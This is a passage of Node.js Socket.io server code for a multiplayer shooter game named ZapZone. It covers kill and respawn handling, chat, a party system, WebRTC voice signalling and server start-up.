    io.to(currentRoom.id).emit('player_damaged', {
      targetId, damage, headshot: data.headshot,
      health: target.health, shooterId: socket.id
    });

    if (target.health <= 0) {
      target.isAlive = false;
      target.deaths++;
      if (currentRoom.scores[targetId]) currentRoom.scores[targetId].deaths++;

      playerData.kills++;
      if (currentRoom.scores[socket.id]) currentRoom.scores[socket.id].kills++;

      io.to(currentRoom.id).emit('player_killed', {
        killerId: socket.id, killerName: playerData.username,
        victimId: targetId, victimName: target.username,
        weapon: playerData.weapon, headshot: data.headshot
      });

      // Respawn after 5 seconds
      const targetSocket = io.sockets.sockets.get(targetId);
      if (targetSocket) {
        setTimeout(() => {
          if (!currentRoom || !DB.rooms[currentRoom.id]) return;
          const spawn = getSpawnPoint(currentRoom.id);
          const account = getAccount(target.username);
          target.health = target.maxHealth;
          target.isAlive = true;
          target.position = spawn;
          io.to(currentRoom.id).emit('player_respawned', {
            playerId: targetId, position: spawn, health: target.maxHealth
          });
        }, 5000);
      }
    }
  });

  socket.on('weapon_change', ({ weapon }) => {
    if (!currentRoom || !playerData) return;
    if (!WEAPONS[weapon]) return;
    playerData.weapon = weapon;
    socket.to(currentRoom.id).emit('player_weapon_changed', { playerId: socket.id, weapon });
  });

  socket.on('chat_message', ({ message }) => {
    if (!currentRoom || !socket.username) return;
    const msg = { from: socket.username, message: message.slice(0, 200), at: Date.now() };
    currentRoom.chat.push(msg);
    if (currentRoom.chat.length > 50) currentRoom.chat.shift();
    io.to(currentRoom.id).emit('chat_message', msg);
  });

  socket.on('global_chat', ({ message }) => {
    if (!socket.username) return;
    const account = getAccount(socket.username);
    const msg = { from: socket.username, message: message.slice(0, 200), role: account?.role, at: Date.now() };
    io.emit('global_chat', msg);
  });

  // ─── Party System ─────────────────────────────────────────────────────────
  socket.on('create_party', () => {
    if (!socket.username) return;
    const partyId = uuidv4().slice(0, 6).toUpperCase();
    DB.parties[partyId] = {
      id: partyId,
      leader: socket.username,
      members: [{ username: socket.username, socketId: socket.id }],
      maxSize: 4,
      status: 'open',
      chat: []
    };
    socket.partyId = partyId;
    socket.join(`party_${partyId}`);
    socket.emit('party_created', DB.parties[partyId]);
  });

  socket.on('join_party', ({ partyId }) => {
    if (!socket.username) return;
    const party = DB.parties[partyId];
    if (!party) { socket.emit('party_error', 'Party not found'); return; }
    if (party.members.length >= party.maxSize) { socket.emit('party_error', 'Party is full'); return; }
    if (party.members.find(m => m.username === socket.username)) { socket.emit('party_error', 'Already in party'); return; }

    party.members.push({ username: socket.username, socketId: socket.id });
    socket.partyId = partyId;
    socket.join(`party_${partyId}`);
    io.to(`party_${partyId}`).emit('party_updated', party);
    socket.emit('party_joined', party);
  });

  socket.on('leave_party', () => {
    if (!socket.partyId) return;
    const party = DB.parties[socket.partyId];
    if (!party) return;
    party.members = party.members.filter(m => m.username !== socket.username);
    socket.leave(`party_${socket.partyId}`);
    if (party.members.length === 0) {
      delete DB.parties[socket.partyId];
    } else if (party.leader === socket.username && party.members.length > 0) {
      party.leader = party.members[0].username;
      io.to(`party_${socket.partyId}`).emit('party_updated', party);
    } else {
      io.to(`party_${socket.partyId}`).emit('party_updated', party);
    }
    socket.partyId = null;
    socket.emit('party_left');
  });

  socket.on('invite_to_party', ({ targetUsername }) => {
    if (!socket.partyId || !socket.username) return;
    const party = DB.parties[socket.partyId];
    if (!party || party.leader !== socket.username) return;
    for (const [sid, sock] of io.sockets.sockets) {
      if (sock.username === targetUsername) {
        sock.emit('party_invite', { partyId: socket.partyId, from: socket.username });
        return;
      }
    }
    socket.emit('party_error', 'Player not online');
  });

  socket.on('party_chat', ({ message }) => {
    if (!socket.partyId) return;
    const msg = { from: socket.username, message: message.slice(0, 200), at: Date.now() };
    io.to(`party_${socket.partyId}`).emit('party_chat', msg);
  });

  socket.on('party_queue', ({ mode }) => {
    if (!socket.partyId) return;
    const party = DB.parties[socket.partyId];
    if (!party || party.leader !== socket.username) return;
    const room = findOrCreateRoom(mode || 'deathmatch');
    for (const member of party.members) {
      const memberSock = io.sockets.sockets.get(member.socketId);
      if (memberSock) {
        const acc = getAccount(member.username);
        if (acc) joinRoom(memberSock, room, acc);
      }
    }
  });

  // ─── Voice Chat (WebRTC Signaling) ────────────────────────────────────────
  socket.on('voice_offer', ({ targetId, offer }) => {
    const target = io.sockets.sockets.get(targetId);
    if (target) target.emit('voice_offer', { from: socket.id, offer });
  });

  socket.on('voice_answer', ({ targetId, answer }) => {
    const target = io.sockets.sockets.get(targetId);
    if (target) target.emit('voice_answer', { from: socket.id, answer });
  });

  socket.on('voice_ice', ({ targetId, candidate }) => {
    const target = io.sockets.sockets.get(targetId);
    if (target) target.emit('voice_ice', { from: socket.id, candidate });
  });

  socket.on('voice_mute', ({ muted }) => {
    if (currentRoom) {
      socket.to(currentRoom.id).emit('player_muted', { playerId: socket.id, muted });
    }
  });

  // ─── Disconnect ───────────────────────────────────────────────────────────
  socket.on('disconnect', () => {
    leaveRoom(socket);
    if (socket.partyId) {
      const party = DB.parties[socket.partyId];
      if (party) {
        party.members = party.members.filter(m => m.socketId !== socket.id);
        if (party.members.length === 0) delete DB.parties[socket.partyId];
        else io.to(`party_${socket.partyId}`).emit('party_updated', party);
      }
    }
    console.log(`[Socket] Disconnected: ${socket.id} (${socket.username || 'guest'})`);
  });
});

// ─── Start Server ─────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`\n╔════════════════════════════════╗`);
  console.log(`║   ZapZone Server - Port ${PORT}   ║`);
  console.log(`╚════════════════════════════════╝`);
  console.log(`  Game:  http://localhost:${PORT}`);
  console.log(`  Admin: http://localhost:${PORT}/admin.html\n`);
});
